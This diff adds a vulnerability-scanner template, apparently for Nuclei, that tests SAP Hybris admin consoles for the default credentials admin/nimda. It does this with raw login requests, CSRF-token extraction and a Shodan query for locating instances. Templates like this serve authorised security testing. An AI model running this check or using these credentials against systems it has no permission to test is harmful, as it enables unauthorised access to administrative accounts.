@@ -1,0 +1,76 @@
+id: hybris-default-login
+
+info:
+  name: Hybris - Default Login
+  author: princechaddha
+  severity: high
+  description: Hybris contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:sap:hybris:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 3
+    shodan-query: title:"Hybris"
+    product: hybris
+    vendor: sap
+  tags: default-login,hybris
+
+http:
+  - raw:
+      - |
+        GET {{path}}login HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST {{path}}j_spring_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}login
+
+        j_username={{username}}&j_password={{password}}&_csrf={{csrftoken}}
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - admin
+      password:
+        - nimda
+
+      path:
+        - /
+        - /hac/
+        - /hmc/
+
+    stop-at-first-match: true
+    host-redirects: true
+    max-redirects: 2
+
+    skip-variables-check: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "hybris administration console"
+          - "You're Administrator"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: csrftoken
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - '<meta name="_csrf" content="([a-z0-9-]+)" \/>'
+# digest: 4a0a0047304502202ef4f3bfdd7ec7d5e360a8b9a2ee99476b25d33dbcca44bb7efb64cb9e9d8c31022100be76b3515e377a42266805219a472a589e2159bfcda783611cac31c486ce798b:922c64590222798bb761d5b6d8e72950
